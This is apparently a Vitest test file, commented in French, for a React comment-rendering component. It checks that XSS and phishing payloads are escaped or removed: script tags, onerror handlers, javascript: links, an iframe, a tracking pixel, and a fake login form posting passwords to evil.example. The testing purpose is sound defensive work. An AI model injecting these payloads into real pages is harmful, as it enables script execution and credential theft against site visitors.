// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { render } from "@testing-library/react";
import { COMMENT_PROSE } from "../lib/commentProse";
import { CommentMarkdown } from "./CommentMarkdown";
import type { CommentMention } from "../types";

/**
 * Tests d'injection du rendu de message.
 *
 * Le texte d'un commentaire est saisi par n'importe quel visiteur : c'est la surface la moins
 * fiable du module. Chaque cas ci-dessous est une charge réelle, et ce qui est vérifié n'est
 * pas « ça ne plante pas » mais « l'élément dangereux n'est PAS dans le DOM rendu ».
 *
 * Deux barrières doivent tenir indépendamment : le parseur (HTML désactivé, règles retirées)
 * et `sanitizeProse`. Les cas 1 à 7 éprouvent la chaîne complète.
 */

function html(text: string, mentions?: readonly CommentMention[]): HTMLElement {
  const { container } = render(createElement(CommentMarkdown, { text, mentions }));
  return container;
}

/**
 * Les attributs réellement portés par le DOM rendu.
 *
 * On interroge le DOM et non `innerHTML` : du HTML échappé contient littéralement la chaîne
 * `onerror=…` sans qu'aucun élément ne la porte — c'est du texte affiché, inoffensif. Chercher
 * la sous-chaîne condamnerait le comportement le plus sûr.
 */
function attributesInDom(root: HTMLElement): string[] {
  const names: string[] = [];
  for (const el of Array.from(root.querySelectorAll("*"))) {
    for (const attr of Array.from(el.attributes)) names.push(attr.name.toLowerCase());
  }
  return names;
}

describe("CommentMarkdown — injection", () => {
  it("1. un <script> ne survit pas au rendu", () => {
    const el = html('<script>alert("xss")</script>');
    expect(el.querySelector("script")).toBeNull();
    expect(el.innerHTML).not.toContain("<script");
  });

  it("2. un gestionnaire d'événement inline n'est porté par aucun élément", () => {
    const el = html('<img src=x onerror="alert(1)">');
    expect(el.querySelector("img")).toBeNull();
    // La balise est ÉCHAPPÉE : la chaîne « onerror » s'affiche en toutes lettres, mais
    // aucun élément ne la porte comme attribut — c'est là qu'est la sécurité.
    expect(attributesInDom(el).filter(name => name.startsWith("on"))).toHaveLength(0);
    expect(el.textContent).toContain("onerror");
  });

  it("3. un lien markdown en `javascript:` ne devient pas cliquable", () => {
    const el = html("[clique](javascript:alert(1))");
    const href = el.querySelector("a")?.getAttribute("href") ?? "";
    expect(href.toLowerCase()).not.toContain("javascript:");
  });

  it("4. une balise <a> écrite en HTML brut est échappée, pas interprétée", () => {
    const el = html('<a href="javascript:alert(1)">piège</a>');
    expect(el.querySelector("a")).toBeNull();
    // `html: false` échappe la balise : elle s'affiche en toutes lettres.
    expect(el.textContent).toContain("<a href=");
  });

  it("5. le faux écran de connexion n'a aucune de ses pièces", () => {
    // La charge qui a motivé le profil `sanitizeProse` : formulaire plein écran servi depuis
    // le domaine de confiance, sans le moindre script.
    const el = html('<div style="position:fixed;inset:0"><form action="https://evil.example">'
      + '<input type="password" name="p"><button>Se connecter</button></form></div>');
    expect(el.querySelector("form")).toBeNull();
    expect(el.querySelector("input")).toBeNull();
    expect(el.querySelector("button")).toBeNull();
    // Aucun élément positionné : le `style` n'existe que dans le texte échappé, où il ne
    // s'applique à rien. Sans conteneur positionné, pas de calque plein écran.
    expect(attributesInDom(el)).not.toContain("style");
  });

  it("6. une <iframe> ne survit pas", () => {
    const el = html('<iframe src="https://evil.example"></iframe>');
    expect(el.querySelector("iframe")).toBeNull();
  });

  it("7. un titre à croisillons s'affiche, sur six niveaux — ce qu'écrit l'éditeur du legacy", () => {
    const el = html("# Un\n## Deux\n### Trois\n#### Quatre\n##### Cinq\n###### Six\nla suite");
    expect([...el.querySelectorAll("h1, h2, h3, h4, h5, h6")].map(h => `${h.tagName} ${h.textContent}`))
      .toEqual(["H1 Un", "H2 Deux", "H3 Trois", "H4 Quatre", "H5 Cinq", "H6 Six"]);
    expect(el.querySelector("p")?.textContent).toBe("la suite");
  });

  it("7 bis. sept croisillons, un croisillon collé à son mot : du texte, pas un titre", () => {
    const el = html("####### sept\n\n#motdièse et #2");
    expect(el.querySelector("h1, h2, h3, h4, h5, h6")).toBeNull();
    expect(el.textContent).toContain("####### sept");
    expect(el.textContent).toContain("#motdièse et #2");
  });

  it("7 ter. un titre n'ouvre aucune porte : le HTML écrit dedans reste du texte", () => {
    const el = html('# <img src=x onerror="alert(1)"> titre');
    expect(el.querySelector("h1")?.textContent).toBe('<img src=x onerror="alert(1)"> titre');
    expect(el.querySelector("img")).toBeNull();
  });

  it("7 quater. un titre SOULIGNÉ, lui, n'existe pas : la règle reste coupée", () => {
    // « Titre » suivi d'une ligne de `=` ou de `-` est un titre en markdown, sans un seul croisillon.
    const el = html("Titre géant\n===\n\nSous-titre\n---");
    expect(el.querySelector("h1, h2, h3, h4, h5, h6")).toBeNull();
    expect(el.textContent).toContain("Titre géant");
  });

  it("8. une image distante n'est pas chargée", () => {
    // Une image distante fuite l'adresse IP de chaque lecteur vers un serveur tiers.
    const el = html("![pixel](https://evil.example/track.png)");
    expect(el.querySelector("img")).toBeNull();
  });

  it("9. un attribut `data-*` est retiré — les sélecteurs de la page les lisent", () => {
    const el = html('<span data-state="open">x</span>');
    expect(el.querySelector("[data-state]")).toBeNull();
  });
});

describe("CommentMarkdown — rendu", () => {
  it("interprète le markdown courant", () => {
    const el = html("**gras** et *italique* et `code`");
    expect(el.querySelector("strong")?.textContent).toBe("gras");
    expect(el.querySelector("em")?.textContent).toBe("italique");
    expect(el.querySelector("code")?.textContent).toBe("code");
  });

  it("respecte les retours à la ligne simples, comme dans une discussion", () => {
    const el = html("première ligne\nseconde ligne");
    expect(el.querySelector("br")).toBeTruthy();
  });

  it("marque les liens sortants `nofollow ugc` — l'arme contre le spam de liens", () => {
    const el = html("https://exemple.test/page");
    const a = el.querySelector("a");
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer nofollow ugc");
    // MESURÉ : `sanitizeProse` retire `target`, donc le composant ne le pose pas — le poser
    // donnerait l'illusion d'un comportement que la sanitisation défait juste après.
    expect(a?.getAttribute("target")).toBeNull();
  });

  it("ne marque pas les liens internes produits par une mention", () => {
    const el = html("@marie", [{ id: "1", name: "Marie", slug: "marie" }]);
    const a = el.querySelector('a[href="/profil/marie"]');
    expect(a).toBeTruthy();
    expect(a?.getAttribute("rel")).toBeNull();
    expect(a?.textContent).toBe("@Marie");
  });

  it("affiche une citation et une liste", () => {
    const el = html("> citation\n\n- un\n- deux");
    expect(el.querySelector("blockquote")).toBeTruthy();
    expect(el.querySelectorAll("li")).toHaveLength(2);
  });

  // L'éditeur du composer porte les MÊMES classes : ce qu'on voit en tapant est ce qu'on lira ici.
  it("porte la mise en forme partagée avec l'éditeur, en plus de celle qu'on lui donne", () => {
    const { container } = render(createElement(CommentMarkdown, { text: "x", className: "à-moi" }));
    const boite = container.firstElementChild!;
    for (const classe of COMMENT_PROSE.split(" ")) expect(boite.classList.contains(classe)).toBe(true);
    expect(boite.classList.contains("à-moi")).toBe(true);
  });
});

describe("CommentMarkdown — le @moi", () => {
  const ME = "a".repeat(24);
  const MENTIONS: readonly CommentMention[] = [
    { id: ME, name: "Raya", slug: "raya" },
    { id: "b".repeat(24), name: "Simon", slug: "simon" },
  ];
  const rendre = (text: string, meId: string | null) =>
    render(createElement(CommentMarkdown, { text, mentions: MENTIONS, meId })).container;

  it("marque MA mention, pas celle d'autrui — la marque survit à l'assainissement", () => {
    const el = rendre("@raya et @simon", ME);
    expect(el.querySelector('a[href="/profil/raya"]')?.hasAttribute("data-mention-me")).toBe(true);
    expect(el.querySelector('a[href="/profil/simon"]')?.hasAttribute("data-mention-me")).toBe(false);
  });

  it("ne marque rien sans utilisateur connu", () => {
    expect(rendre("@raya", null).querySelector("[data-mention-me]")).toBeNull();
  });

  it("un auteur ne peut pas forger la marque : son HTML est échappé", () => {
    const el = rendre('<a href="/profil/simon" data-mention-me>faux</a>', ME);
    expect(el.querySelector("[data-mention-me]")).toBeNull();
  });
});
